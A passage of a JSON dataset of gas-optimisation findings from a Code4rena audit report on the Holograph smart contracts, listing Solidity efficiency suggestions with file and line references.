      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "#g-25-internal-functions-not-called-by-the-contract-should-be-removed-to-save-deployment-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "5635",
      "title": "[G-23] internal functions only called once can be inlined to save gas",
      "impact": "GAS",
      "content": "\nNot inlining costs 20 to 40 gas because of two extra JUMP instructions and additional stack operations needed for function calls.\n\n```\n2022-10-holograph/contracts/abstract/ERC20H.sol::203 => function _setOwner(address ownerAddress) internal {\n2022-10-holograph/contracts/abstract/ERC721H.sol::203 => function _setOwner(address ownerAddress) internal {\n2022-10-holograph/contracts/module/LayerZeroModule.sol::225 => * @dev Need to add an extra function to get LZ gas amount needed for their internal cross-chain message verification\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "#g-23-internal-functions-only-called-once-can-be-inlined-to-save-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "5634",
      "title": "[G-22] Using storage instead of memory for structs/arrays saves gas",
      "impact": "GAS",
      "content": "\nWhen fetching data from a storage location, assigning the data to a memory variable causes all fields of the struct/array to be read from storage, which incurs a Gcoldsload (2100 gas) for each field of the struct/array. If the fields are read from the new memory variable, they incur an additional MLOAD rather than a cheap stack read.\n\nInstead of declearing the variable with the memory keyword, declaring the variable with the storage keyword and caching any fields that need to be re-read in stack variables, will be much cheaper, only incuring the Gcoldsload for the fields actually read. The only time it makes sense to read the whole struct/array into a memory variable, is if the full struct/array is being returned by the function, is being passed to a function that requires memory, or if the array/struct is being read from another memory array/struct\n\n```\n2022-10-holograph/contracts/enforcer/PA1D.sol::541 => address[] memory receivers = new address[](1);\n2022-10-holograph/contracts/enforcer/PA1D.sol::543 => uint256[] memory bps = new uint256[](1);\n2022-10-holograph/contracts/enforcer/PA1D.sol::559 => uint256[] memory bps = new uint256[](1);\n2022-10-holograph/contracts/enforcer/PA1D.sol::570 => address payable[] memory receivers = new address payable[](1);\n2022-10-holograph/contracts/enforcer/PA1D.sol::591 => address payable[] memory receivers = new address payable[](1);\n2022-10-holograph/contracts/enforcer/PA1D.sol::592 => uint256[] memory bps = new uint256[](1);\n2022-10-holograph/contracts/enforcer/PA1D.sol::605 => address payable[] memory receivers = new address payable[](1);\n2022-10-holograph/contracts/enforcer/PA1D.sol::606 => uint256[] memory bps = new uint256[](1);\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "#g-22-using-storage-instead-of-memory-for-structsarrays-saves-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "5633",
      "title": "[G-21] Use selfbalance()",
      "impact": "GAS",
      "content": "\nUse selfbalance() instead of address(this).balance when getting your contract's balance of ETH to save gas.\n\n```\n2022-10-holograph/contracts/enforcer/PA1D.sol::389 => uint256 balance = address(this).balance;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "#g-21-use-selfbalance",
      "tags": [],
      "finders": []
    },
    {
      "id": "5632",
      "title": "[G-20] Use assembly to check for address(0)",
      "impact": "GAS",
      "content": "\nSaves 6 gas per instance if using assembly to check for address(0)\n\ne.g.\n```\nassembly {\n if iszero(_addr) {\n  mstore(0x00, \"zero address\")\n  revert(0x00, 0x20)\n }\n}\n```\n\ninstances:\n\n```\n2022-10-holograph/contracts/HolographOperator.sol::333 => if (job.operator != address(0)) {\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::620 => require(account != address(0), \"ERC20: account is zero address\");\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::621 => require(spender != address(0), \"ERC20: spender is zero address\");\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::627 => require(account != address(0), \"ERC20: account is zero address\");\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::684 => require(to != address(0), \"ERC20: minting to burn address\");\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::695 => require(account != address(0), \"ERC20: account is zero address\");\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::696 => require(recipient != address(0), \"ERC20: recipient is zero address\");\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::419 => require(to != address(0), \"ERC721: zero address\");\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::639 => require(wallet != address(0), \"ERC721: zero address\");\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::657 => return _tokenOwner[tokenId] != address(0);\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::689 => require(tokenOwner != address(0), \"ERC721: token does not exist\");\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::816 => require(to != address(0), \"ERC721: minting to burn address\");\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::870 => require(to != address(0), \"ERC721: use burn instead\");\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::895 => return tokenOwner != address(0);\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "#g-20-use-assembly-to-check-for-address0",
      "tags": [],
      "finders": []
    },
    {
      "id": "5631",
      "title": "[G-19] Multiple address mappings can be combined into a single mapping of an address to a struct, where appropriate",
      "impact": "GAS",
      "content": "\nSaves a storage slot for the mapping. Depending on the circumstances and sizes of types, can avoid a Gsset (20000 gas) per mapping combined. Reads and subsequent writes can also be cheaper when a function requires both values and they both fit in the same storage slot. Finally, if both fields are accessed in the same function, can save ~42 gas per access due to not having to recalculate the key's keccak256 hash (Gkeccak256 - 30 gas) and that calculation's associated stack operations.\n\n```\n2022-10-holograph/contracts/HolographOperator.sol::218 => mapping(address => uint256) private _bondedOperators;\n2022-10-holograph/contracts/HolographOperator.sol::223 => mapping(address => uint256) private _operatorPodIndex;\n2022-10-holograph/contracts/HolographOperator.sol::228 => mapping(address => uint256) private _bondedAmounts;\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::156 => mapping(address => uint256) private _balances;\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::161 => mapping(address => mapping(address => uint256)) private _allowances;\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::186 => mapping(address => uint256) private _nonces;\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::185 => mapping(address => uint256) private _ownedTokensCount;\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::190 => mapping(address => uint256[]) private _ownedTokens;\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::196 => mapping(address => mapping(address => bool)) private _operatorApprovals;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "#g-19-multiple-address-mappings-can-be-combined-into-a-single-mapping-of-an-address-to-a-struct-where-appropriate",
      "tags": [],
      "finders": []
    },
    {
      "id": "5630",
      "title": "[G-18] Not using the named return variables when a function returns, wastes deployment gas",
      "impact": "GAS",
      "content": "\nIt is not necessary to have both a named return and a return statement.\n\n```\n2022-10-holograph/contracts/HolographFactory.sol::181 => ) external pure returns (bytes4 selector, bytes memory data) {\n2022-10-holograph/contracts/HolographOperator.sol::717 => function getTotalPods() external view returns (uint256 totalPods) {\n2022-10-holograph/contracts/HolographOperator.sol::804 => function getBondedAmount(address operator) external view returns (uint256 amount) {\n2022-10-holograph/contracts/HolographOperator.sol::814 => function getBondedPod(address operator) external view returns (uint256 pod) {\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::396 => ) external onlyBridge returns (bytes4 selector, bytes memory data) {\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::417 => ) external onlyBridge returns (bytes4 selector, bytes memory data) {\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::761 => try HolographERC721Interface(_operator).ownerOf(_tokenId) returns (address tokenOwner) {\n2022-10-holograph/contracts/enforcer/PA1D.sol::549 => function royaltyInfo(uint256 tokenId, uint256 value) public view returns (address, uint256) {\n2022-10-holograph/contracts/enforcer/PA1D.sol::569 => function getFeeRecipients(uint256 tokenId) public view returns (address payable[] memory) {\n2022-10-holograph/contracts/enforcer/PA1D.sol::590 => function getRoyalties(uint256 tokenId) public view returns (address payable[] memory, uint256[] memory) {\n2022-10-holograph/contracts/enforcer/PA1D.sol::604 => function getFees(uint256 tokenId) public view returns (address payable[] memory, uint256[] memory) {\n2022-10-holograph/contracts/enforcer/PA1D.sol::665 => function bidSharesForToken(uint256 tokenId) public view returns (ZoraBidShares memory bidShares) {\n2022-10-holograph/contracts/module/LayerZeroModule.sol::256 => ) external view returns (uint256 hlgFee, uint256 msgFee) {\n2022-10-holograph/contracts/module/LayerZeroModule.sol::281 => ) external view returns (uint256 hlgFee) {\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "#g-18-not-using-the-named-return-variables-when-a-function-returns-wastes-deployment-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "5629",
      "title": "[G-17] Public functions not called by the contract should be declared external instead",
      "impact": "GAS",
      "content": "\nContracts are allowed to override their parents' functions and change the visibility from external to public and can save gas by doing so.\n\n```\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::273 => function decimals() public view returns (uint8) {\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::297 => function allowance(address account, address spender) public view returns (uint256) {\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::306 => function DOMAIN_SEPARATOR() public view returns (bytes32) {\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::310 => function name() public view returns (string memory) {\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::314 => function nonces(address account) public view returns (uint256) {\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::318 => function symbol() public view returns (string memory) {\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::322 => function totalSupply() public view returns (uint256) {\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::347 => function burnFrom(address account, uint256 amount) public returns (bool) {\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::363 => function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::420 => function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::643 => function burned(uint256 tokenId) public view returns (bool) {\n2022-10-holograph/contracts/enforcer/PA1D.sol::471 => function configurePayouts(address payable[] memory addresses, uint256[] memory bps) public onlyOwner {\n2022-10-holograph/contracts/enforcer/PA1D.sol::488 => function getPayoutInfo() public view returns (address payable[] memory addresses, uint256[] memory bps) {\n2022-10-holograph/contracts/enforcer/PA1D.sol::497 => function getEthPayout() public {\n2022-10-holograph/contracts/enforcer/PA1D.sol::507 => function getTokenPayout(address tokenAddress) public {\n2022-10-holograph/contracts/enforcer/PA1D.sol::517 => function getTokensPayout(address[] memory tokenAddresses) public {\n2022-10-holograph/contracts/enforcer/PA1D.sol::549 => function royaltyInfo(uint256 tokenId, uint256 value) public view returns (address, uint256) {\n2022-10-holograph/contracts/enforcer/PA1D.sol::558 => function getFeeBps(uint256 tokenId) public view returns (uint256[] memory) {\n2022-10-holograph/contracts/enforcer/PA1D.sol::569 => function getFeeRecipients(uint256 tokenId) public view returns (address payable[] memory) {\n2022-10-holograph/contracts/enforcer/PA1D.sol::604 => function getFees(uint256 tokenId) public view returns (address payable[] memory, uint256[] memory) {\n2022-10-holograph/contracts/enforcer/PA1D.sol::649 => function marketContract() public view returns (address) {\n2022-10-holograph/contracts/enforcer/PA1D.sol::655 => function tokenCreators(uint256 tokenId) public view returns (address) {\n2022-10-holograph/contracts/enforcer/PA1D.sol::665 => function bidSharesForToken(uint256 tokenId) public view returns (ZoraBidShares memory bidShares) {\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "#g-17-public-functions-not-called-by-the-contract-should-be-declared-external-instead",
      "tags": [],
      "finders": []
    },
    {
      "id": "5628",
      "title": "[G-16] Splitting require() statements that use && saves gas",
      "impact": "GAS",
      "content": "\nSaves 16 gas per instance.\nIf you're using the Optimizer at 200, instead of using the && operator in a single require statement to check multiple conditions, multiple require statements with 1 condition per require statement should be used to save gas:\n\n```\n2022-10-holograph/contracts/HolographOperator.sol::857 => require(_bondedOperators[operator] == 0 && _bondedAmounts[operator] == 0, \"HOLOGRAPH: operator is bonded\");\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::263 => require(success && selector == InitializableInterface.init.selector, \"ERC721: coud not init PA1D\");\n2022-10-holograph/contracts/enforcer/Holographer.sol::166 => require(success && selector == InitializableInterface.init.selector, \"initialization failed\");\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "#g-16-splitting-require-statements-that-use--saves-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "5627",
      "title": "[G-15] Use bytes32 instead of string",
      "impact": "GAS",
      "content": "\nUse bytes32 instead of string to save gas whenever possible. String is a dynamic data structure and therefore is more gas consuming then bytes32.\n\n```\n2022-10-holograph/contracts/enforcer/PA1D.sol::142 => string constant _bpString = \"eip1967.Holograph.PA1D.bp\";\n2022-10-holograph/contracts/enforcer/PA1D.sol::143 => string constant _receiverString = \"eip1967.Holograph.PA1D.receiver\";\n2022-10-holograph/contracts/enforcer/PA1D.sol::144 => string constant _tokenAddressString = \"eip1967.Holograph.PA1D.tokenAddress\";\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "#g-15-use-bytes32-instead-of-string",
      "tags": [],
      "finders": []
    },
    {
      "id": "5626",
      "title": "[G-14] Prefix increments cheaper than Postfix increments",
      "impact": "GAS",
      "content": "\n++i costs less gas than i++, especially when it's used in for-loops (--i/i-- too)\nSaves 5 gas PER LOOP\n\n```\n2022-10-holograph/contracts/HolographOperator.sol::781 => for (uint256 i = 0; i < length; i++) {\n2022-10-holograph/contracts/HolographOperator.sol::871 => for (uint256 i = _operatorPods.length; i <= pod; i++) {\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::564 => for (uint256 i = 0; i < wallets.length; i++) {\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::357 => for (uint256 i = 0; i < length; i++) {\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::716 => for (uint256 i = 0; i < length; i++) {\n2022-10-holograph/contracts/enforcer/PA1D.sol::307 => for (uint256 i = 0; i < length; i++) {\n2022-10-holograph/contracts/enforcer/PA1D.sol::323 => for (uint256 i = 0; i < length; i++) {\n2022-10-holograph/contracts/enforcer/PA1D.sol::340 => for (uint256 i = 0; i < length; i++) {\n2022-10-holograph/contracts/enforcer/PA1D.sol::356 => for (uint256 i = 0; i < length; i++) {\n2022-10-holograph/contracts/enforcer/PA1D.sol::394 => for (uint256 i = 0; i < length; i++) {\n2022-10-holograph/contracts/enforcer/PA1D.sol::414 => for (uint256 i = 0; i < length; i++) {\n2022-10-holograph/contracts/enforcer/PA1D.sol::437 => for (uint256 i = 0; i < addresses.length; i++) {\n2022-10-holograph/contracts/enforcer/PA1D.sol::454 => for (uint256 i = 0; i < addresses.length; i++) {\n2022-10-holograph/contracts/enforcer/PA1D.sol::474 => for (uint256 i = 0; i < addresses.length; i++) {\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "#g-14-prefix-increments-cheaper-than-postfix-increments",
      "tags": [],
      "finders": []
    },
    {
      "id": "5625",
      "title": "[G-13] Use custom errors rather than revert()/require() strings to save gas",
      "impact": "GAS",
      "content": "\nCustom errors are available from solidity version 0.8.4. Custom errors save ~50 gas each time they're hitby avoiding having to allocate and store the revert string. Not defining the strings also save deployment gas\n\n```\n2022-10-holograph/contracts/HolographBridge.sol::148 => require(msg.sender == address(_operator()), \"HOLOGRAPH: operator only call\");\n2022-10-holograph/contracts/HolographBridge.sol::163 => require(!_isInitialized(), \"HOLOGRAPH: already initialized\");\n2022-10-holograph/contracts/HolographBridge.sol::214 => require(selector == Holographable.bridgeIn.selector, \"HOLOGRAPH: bridge in failed\");\n2022-10-holograph/contracts/HolographBridge.sol::233 => require(doNotRevert, \"HOLOGRAPH: reverted\");\n2022-10-holograph/contracts/HolographBridge.sol::270 => require(selector == Holographable.bridgeOut.selector, \"HOLOGRAPH: bridge out failed\");\n2022-10-holograph/contracts/HolographFactory.sol::144 => require(!_isInitialized(), \"HOLOGRAPH: already initialized\");\n2022-10-holograph/contracts/HolographFactory.sol::220 => require(_verifySigner(signature.r, signature.s, signature.v, hash, signer), \"HOLOGRAPH: invalid signature\");\n2022-10-holograph/contracts/HolographFactory.sol::228 => require(!_isContract(holographerAddress), \"HOLOGRAPH: already deployed\");\n2022-10-holograph/contracts/HolographOperator.sol::241 => require(!_isInitialized(), \"HOLOGRAPH: already initialized\");\n2022-10-holograph/contracts/HolographOperator.sol::309 => require(_operatorJobs[hash] > 0, \"HOLOGRAPH: invalid job\");\n2022-10-holograph/contracts/HolographOperator.sol::350 => require(timeDifference > 0, \"HOLOGRAPH: operator has time\");\n2022-10-holograph/contracts/HolographOperator.sol::354 => require(gasPrice >= tx.gasprice, \"HOLOGRAPH: gas spike detected\");\n2022-10-holograph/contracts/HolographOperator.sol::368 => require(fallbackOperator == msg.sender, \"HOLOGRAPH: invalid fallback\");\n2022-10-holograph/contracts/HolographOperator.sol::415 => require(gasleft() > gasLimit, \"HOLOGRAPH: not enough gas left\");\n2022-10-holograph/contracts/HolographOperator.sol::446 => require(msg.sender == address(this), \"HOLOGRAPH: operator only call\");\n2022-10-holograph/contracts/HolographOperator.sol::485 => require(msg.sender == address(_messagingModule()), \"HOLOGRAPH: messaging only call\");\n2022-10-holograph/contracts/HolographOperator.sol::591 => require(msg.sender == _bridge(), \"HOLOGRAPH: bridge only call\");\n2022-10-holograph/contracts/HolographOperator.sol::595 => require(hlgFee < msg.value, \"HOLOGRAPH: not enough value\");\n2022-10-holograph/contracts/HolographOperator.sol::728 => require(_operatorPods.length >= pod, \"HOLOGRAPH: pod does not exist\");\n2022-10-holograph/contracts/HolographOperator.sol::739 => require(_operatorPods.length >= pod, \"HOLOGRAPH: pod does not exist\");\n2022-10-holograph/contracts/HolographOperator.sol::756 => require(_operatorPods.length >= pod, \"HOLOGRAPH: pod does not exist\");\n2022-10-holograph/contracts/HolographOperator.sol::829 => require(_bondedOperators[operator] != 0, \"HOLOGRAPH: operator not bonded\");\n2022-10-holograph/contracts/HolographOperator.sol::839 => require(_utilityToken().transferFrom(msg.sender, address(this), amount), \"HOLOGRAPH: token transfer failed\");\n2022-10-holograph/contracts/HolographOperator.sol::857 => require(_bondedOperators[operator] == 0 && _bondedAmounts[operator] == 0, \"HOLOGRAPH: operator is bonded\");\n2022-10-holograph/contracts/HolographOperator.sol::863 => require(current <= amount, \"HOLOGRAPH: bond amount too small\");\n2022-10-holograph/contracts/HolographOperator.sol::881 => require(_operatorPods[pod - 1].length < type(uint16).max, \"HOLOGRAPH: too many operators\");\n2022-10-holograph/contracts/HolographOperator.sol::889 => require(_utilityToken().transferFrom(msg.sender, address(this), amount), \"HOLOGRAPH: token transfer failed\");\n2022-10-holograph/contracts/HolographOperator.sol::903 => require(_bondedOperators[operator] != 0, \"HOLOGRAPH: operator not bonded\");\n2022-10-holograph/contracts/HolographOperator.sol::911 => require(_isContract(operator), \"HOLOGRAPH: operator not contract\");\n2022-10-holograph/contracts/HolographOperator.sol::915 => require(Ownable(operator).isOwner(msg.sender), \"HOLOGRAPH: sender not owner\");\n2022-10-holograph/contracts/HolographOperator.sol::932 => require(_utilityToken().transfer(recipient, amount), \"HOLOGRAPH: token transfer failed\");\n2022-10-holograph/contracts/abstract/ERC20H.sol::117 => require(msg.sender == holographer(), \"ERC20: holographer only\");\n2022-10-holograph/contracts/abstract/ERC20H.sol::123 => require(msgSender() == _getOwner(), \"ERC20: owner only function\");\n2022-10-holograph/contracts/abstract/ERC20H.sol::125 => require(msg.sender == _getOwner(), \"ERC20: owner only function\");\n2022-10-holograph/contracts/abstract/ERC20H.sol::147 => require(!_isInitialized(), \"ERC20: already initialized\");\n2022-10-holograph/contracts/abstract/ERC721H.sol::117 => require(msg.sender == holographer(), \"ERC721: holographer only\");\n2022-10-holograph/contracts/abstract/ERC721H.sol::123 => require(msgSender() == _getOwner(), \"ERC721: owner only function\");\n2022-10-holograph/contracts/abstract/ERC721H.sol::125 => require(msg.sender == _getOwner(), \"ERC721: owner only function\");\n2022-10-holograph/contracts/abstract/ERC721H.sol::147 => require(!_isInitialized(), \"ERC721: already initialized\");\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::192 => require(msg.sender == _holograph().getBridge(), \"ERC20: bridge only call\");\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::204 => require(msg.sender == sourceContract, \"ERC20: source only call\");\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::219 => require(!_isInitialized(), \"ERC20: already initialized\");\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::241 => require(sourceContract.init(initCode) == InitializableInterface.init.selector, \"ERC20: could not init source\");\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::349 => require(currentAllowance >= amount, \"ERC20: amount exceeds allowance\");\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::365 => require(currentAllowance >= subtractedValue, \"ERC20: decreased below zero\");\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::387 => require(SourceERC20().bridgeIn(fromChain, from, to, amount, data), \"HOLOGRAPH: bridge in failed\");\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::400 => require(currentAllowance >= amount, \"ERC20: amount exceeds allowance\");\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::427 => require(newAllowance >= currentAllowance, \"ERC20: increased above max value\");\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::445 => require(_isContract(account), \"ERC20: operator not contract\");\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::450 => require(balance >= amount, \"ERC20: balance check failed\");\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::469 => require(block.timestamp <= deadline, \"ERC20: expired deadline\");\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::482 => require(signer == account, \"ERC20: invalid signature\");\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::505 => require(_checkOnERC20Received(msg.sender, recipient, amount, data), \"ERC20: non ERC20Receiver\");\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::529 => require(currentAllowance >= amount, \"ERC20: amount exceeds allowance\");\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::539 => require(_checkOnERC20Received(account, recipient, amount, data), \"ERC20: non ERC20Receiver\");\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::599 => require(currentAllowance >= amount, \"ERC20: amount exceeds allowance\");\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::620 => require(account != address(0), \"ERC20: account is zero address\");\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::621 => require(spender != address(0), \"ERC20: spender is zero address\");\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::627 => require(account != address(0), \"ERC20: account is zero address\");\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::629 => require(accountBalance >= amount, \"ERC20: amount exceeds balance\");\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::645 => require(erc165support, \"ERC20: no ERC165 support\");\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::684 => require(to != address(0), \"ERC20: minting to burn address\");\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::695 => require(account != address(0), \"ERC20: account is zero address\");\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::696 => require(recipient != address(0), \"ERC20: recipient is zero address\");\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::698 => require(accountBalance >= amount, \"ERC20: amount exceeds balance\");\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::212 => require(msg.sender == _holograph().getBridge(), \"ERC721: bridge only call\");\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::224 => require(msg.sender == sourceContract, \"ERC721: source only call\");\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::239 => require(!_isInitialized(), \"ERC721: already initialized\");\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::258 => require(sourceContract.init(initCode) == InitializableInterface.init.selector, \"ERC721: could not init source\");\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::263 => require(success && selector == InitializableInterface.init.selector, \"ERC721: coud not init PA1D\");\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::323 => require(_exists(tokenId), \"ERC721: token does not exist\");\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::370 => require(to != tokenOwner, \"ERC721: cannot approve self\");\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::371 => require(_isApproved(msg.sender, tokenId), \"ERC721: not approved sender\");\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::388 => require(_isApproved(msg.sender, tokenId), \"ERC721: not approved sender\");\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::404 => require(!_exists(tokenId), \"ERC721: token already exists\");\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::408 => require(SourceERC721().bridgeIn(fromChain, from, to, tokenId, data), \"HOLOGRAPH: bridge in failed\");\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::419 => require(to != address(0), \"ERC721: zero address\");\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::420 => require(_isApproved(sender, tokenId), \"ERC721: sender not approved\");\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::421 => require(from == _tokenOwner[tokenId], \"ERC721: from is not owner\");\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::458 => require(_isApproved(msg.sender, tokenId), \"ERC721: not approved sender\");\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::484 => require(to != msg.sender, \"ERC721: cannot approve self\");\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::513 => require(!_burnedTokens[token], \"ERC721: can't mint burned token\");\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::622 => require(_isApproved(msg.sender, tokenId), \"ERC721: not approved sender\");\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::639 => require(wallet != address(0), \"ERC721: zero address\");\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::689 => require(tokenOwner != address(0), \"ERC721: token does not exist\");\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::700 => require(index < _allTokens.length, \"ERC721: index out of bounds\");\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::729 => require(index < balanceOf(wallet), \"ERC721: index out of bounds\");\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::757 => require(_isContract(_operator), \"ERC721: operator not contract\");\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::762 => require(tokenOwner == address(this), \"ERC721: contract not token owner\");\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::815 => require(tokenId > 0, \"ERC721: token id cannot be zero\");\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::816 => require(to != address(0), \"ERC721: minting to burn address\");\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::817 => require(!_exists(tokenId), \"ERC721: token already exists\");\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::818 => require(!_burnedTokens[tokenId], \"ERC721: token has been burned\");\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::869 => require(_tokenOwner[tokenId] == from, \"ERC721: token not owned\");\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::870 => require(to != address(0), \"ERC721: use burn instead\");\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::906 => require(_exists(tokenId), \"ERC721: token does not exist\");\n2022-10-holograph/contracts/enforcer/Holographer.sol::148 => require(!_isInitialized(), \"HOLOGRAPHER: already initialized\");\n2022-10-holograph/contracts/enforcer/Holographer.sol::166 => require(success && selector == InitializableInterface.init.selector, \"initialization failed\");\n2022-10-holograph/contracts/enforcer/PA1D.sol::159 => require(isOwner(), \"PA1D: caller not an owner\");\n2022-10-holograph/contracts/enforcer/PA1D.sol::174 => require(!_isInitialized(), \"PA1D: already initialized\");\n2022-10-holograph/contracts/enforcer/PA1D.sol::190 => require(initialized == 0, \"PA1D: already initialized\");\n2022-10-holograph/contracts/enforcer/PA1D.sol::390 => require(balance - gasCost > 10000, \"PA1D: Not enough ETH to transfer\");\n2022-10-holograph/contracts/enforcer/PA1D.sol::411 => require(balance > 10000, \"PA1D: Not enough tokens to transfer\");\n2022-10-holograph/contracts/enforcer/PA1D.sol::416 => require(erc20.transfer(addresses[i], sending), \"PA1D: Couldn't transfer token\");\n2022-10-holograph/contracts/enforcer/PA1D.sol::435 => require(balance > 10000, \"PA1D: Not enough tokens to transfer\");\n2022-10-holograph/contracts/enforcer/PA1D.sol::439 => 